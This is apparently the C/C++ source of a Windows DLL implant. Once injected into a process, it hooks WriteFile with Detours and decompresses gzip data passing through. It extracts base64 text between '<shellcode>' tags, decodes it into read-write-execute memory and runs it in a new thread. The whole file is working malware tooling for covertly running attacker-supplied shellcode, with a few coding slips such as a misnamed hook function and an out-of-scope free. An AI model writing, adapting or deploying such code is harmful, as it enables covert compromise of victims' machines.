#include "pch.h"
#include "dllmain.h"
#include "detours.h"

#include <malloc.h>
#include <wincrypt.h>

#include "tinf/src/tinf.h"

#ifdef _WIN64:
    #pragma comment (lib, "detours.x64.lib")
#endif

#ifdef _WIN32:
    #pragma comment (lib, "detours.x86.lib")
#endif

#define SHCPATTERN1 "<shellcode>"
#define SHCPATTERN2 "</shellcode>"

HANDLE g_hLogFile = NULL;
FUNC_WriteFile Clean_WriteFile = NULL;

static unsigned int read_le32(const unsigned char *p)
{
	return ((unsigned int) p[0])
	     | ((unsigned int) p[1] << 8)
	     | ((unsigned int) p[2] << 16)
	     | ((unsigned int) p[3] << 24);
}

BOOL ExecuteShellcode(char* shellcode)
{
    DWORD dwOutLen;
    int shellcode_len = strlen(shellcode);

    FUNC_CryptStringToBinaryA CryptStringToBinaryA = (FUNC_CryptStringToBinaryA)GetProcAddress(
                                                        LoadLibraryA("crypt32.dll"), 
                                                        "CryptStringToBinaryA");

    CryptStringToBinaryA(
        (LPCSTR)shellcode,
        (DWORD)shellcode_len,
        CRYPT_STRING_BASE64,
        NULL,
        &dwOutLen,
        NULL,
        NULL
    );

    BYTE* pbBinary = (BYTE*)malloc(dwOutLen + 1);

    CryptStringToBinaryA(
        (LPCSTR)shellcode,
        (DWORD)shellcode_len,
        CRYPT_STRING_BASE64,
        pbBinary,
        &dwOutLen,
        NULL,
        NULL
    );

    void* module = VirtualAlloc(0, dwOutLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    memcpy(module, pbBinary, dwOutLen);

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)module, NULL, 0, 0);

    return TRUE;

}

BOOL Hooked_WriteFile(HANDLE hFile,
	LPCVOID      lpBuffer,
	DWORD        nNumberOfBytesToWrite,
	LPDWORD      lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped)
{
    int res;
    DWORD i;
    unsigned char *dest = NULL;
    unsigned char *source = NULL;
    unsigned int len, dlen, outlen;
    DWORD_PTR dwBuf = (DWORD_PTR)lpBuffer;

    if (hFile == (HANDLE)WRITEFILE_HOOKED && lpBuffer == NULL)
    {
        return TRUE;
    }

    if (lpBuffer != NULL && nNumberOfBytesToWrite >= 18)
    {
        tinf_init();

        auto ucharptr = static_cast<const unsigned char*>(lpBuffer);
        source = const_cast<unsigned char*>(ucharptr);

        dlen = read_le32(&source[nNumberOfBytesToWrite - 4]);

        dest = (unsigned char *) malloc(dlen ? dlen : 1);
        if (dest == NULL)
        {
            goto APICALL;
        }

        outlen = dlen;

        res = tinf_gzip_uncompress(dest, &outlen, source, nNumberOfBytesToWrite);

        if ((res != TINF_OK) || (outlen != dlen)) 
        {
            free(dest);
            goto APICALL;
        }

        for (i = 0; i < outlen; i++)
        {
            if (!memcmp((PVOID)(dest + i), (unsigned char*)SHCPATTERN1, strlen(SHCPATTERN1)))
            {
                char *target = NULL;
                char *start, *end;

                if ( start = strstr( (char*)dest, SHCPATTERN1 ) )
                {
                    start += strlen( SHCPATTERN1 );
                    if ( end = strstr( start, SHCPATTERN2 ) )
                    {
                        target = ( char * )malloc( end - start + 1 );
                        memcpy( target, start, end - start );
                        target[end - start] = '\0';

                        ExecuteShellcode(target);
                    }
                }
            }
        }

        free(dest);
        free(target);
        
        goto APICALL;
    }

    // call writefile straight away, dont bother with looking for shellcode in plain text responces
    goto APICALL;

APICALL:
    return Clean_WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped);
}

BOOL PlaceReadFileHook()
{
    /*
    Use detours to place a hook on the ReadFile API.
    */

    BOOL bStatus = TRUE;

    if (WriteFile((HANDLE)WRITEFILE_HOOKED, NULL, NULL, NULL, NULL))
    {
        goto Cleanup;
    }

    if (Clean_WriteFile != NULL)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourTransactionBegin() != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourUpdateThread(GetCurrentThread()) != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;  
    }

    if ((Clean_WriteFile = (FUNC_WriteFile)GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteFile")) == NULL)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourAttach((PVOID*)&Clean_WriteFile, Hooked_WriteFile) != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (DetourTransactionCommit() != NO_ERROR)
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    if (!WriteFile((HANDLE)WRITEFILE_HOOKED, NULL, NULL, NULL, NULL))
    {
        bStatus = FALSE;
        goto Cleanup;
    }

    goto Cleanup;

Cleanup:

    if (!bStatus)
    {
        DetourTransactionAbort();
    }
    
    return bStatus;
}

VOID WireTapMain()
{
    /*
    Place the hook.
    */

    DWORD dwTid;
	HANDLE hThread;

    MessageBoxA(NULL, "Injected", "Injected", 0);

    if (!PlaceReadFileHook())
    {
        goto Cleanup;
    }

    goto Cleanup;

Cleanup:
    return;
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        WireTapMain();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

